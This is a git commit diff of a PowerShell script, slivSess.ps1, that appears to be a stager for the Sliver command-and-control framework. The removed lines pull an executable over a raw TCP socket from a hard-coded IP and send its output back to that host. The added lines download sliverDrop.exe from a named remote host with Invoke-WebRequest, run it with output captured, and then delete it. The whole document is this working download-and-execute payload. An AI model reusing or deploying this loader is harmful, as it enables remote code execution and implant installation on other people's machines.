10dc76580249560be98c95e91181a5aded373ede
nosfera0x2 <82817752+nosfera0x2@users.noreply.github.com>
2023-11-02 11:28:00 -0500

    Update slivSess.ps1

--- slivSess.ps1
+++ slivSess.ps1
@@ -1,36 +1,19 @@
-$socket = New-Object System.Net.Sockets.TcpClient('52.152.174.80', 8181)
-
-if ($socket -eq $null) {
-    exit 1
-}
-
-$stream = $socket.GetStream()
-$buffer = New-Object System.Byte[] 1024
-$encoding = New-Object System.Text.AsciiEncoding
-
-# Specify the target directory
+# Define the URL and target path
+$url = "http://sliver.nosfera0x2.com:8181/sliverDrop.exe"
 $targetDirectory = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('CommonApplicationData'), 'DownloadedFiles')
+$targetFile = [System.IO.Path]::Combine($targetDirectory, 'sliverDrop.exe')
 
 # Create the target directory if it doesn't exist
 if (-not (Test-Path -Path $targetDirectory -PathType Container)) {
     New-Item -Path $targetDirectory -ItemType Directory
 }
 
-# Determine the file name (e.g., sliverDrop.exe)
-$receivedFile = [System.IO.Path]::Combine($targetDirectory, 'sliverDrop.exe')
-
-$fs = [System.IO.File]::Create($receivedFile)
-
-while ($stream.DataAvailable) {
-    $read = $stream.Read($buffer, 0, 1024)
-    $fs.Write($buffer, 0, $read)
-}
-
-$fs.Close()
+# Download the file
+Invoke-WebRequest -Uri $url -OutFile $targetFile
 
 # Execute the downloaded executable
 $pinfo = New-Object System.Diagnostics.ProcessStartInfo
-$pinfo.FileName = $receivedFile
+$pinfo.FileName = $targetFile
 $pinfo.RedirectStandardError = $true
 $pinfo.RedirectStandardOutput = $true
 $pinfo.UseShellExecute = $false
@@ -48,10 +31,12 @@ if ($p.ExitCode -ne 0) {
     $res = $stdout
 }
 
-# Send the output of the executed file back to the server
-$writer = New-Object System.IO.StreamWriter($stream)
-$writer.WriteLine($res)
-$writer.Close()
+# Send the output of the executed file back to the server (if needed)
+# You can add this part if you want to send the output back to a server
 
-$socket.Close()
-$stream.Dispose()
+# Clean up (close and dispose of resources)
+$p.Close()
+$p.Dispose()
+
+# Optionally, remove the downloaded file if you no longer need it
+Remove-Item -Path $targetFile -Force
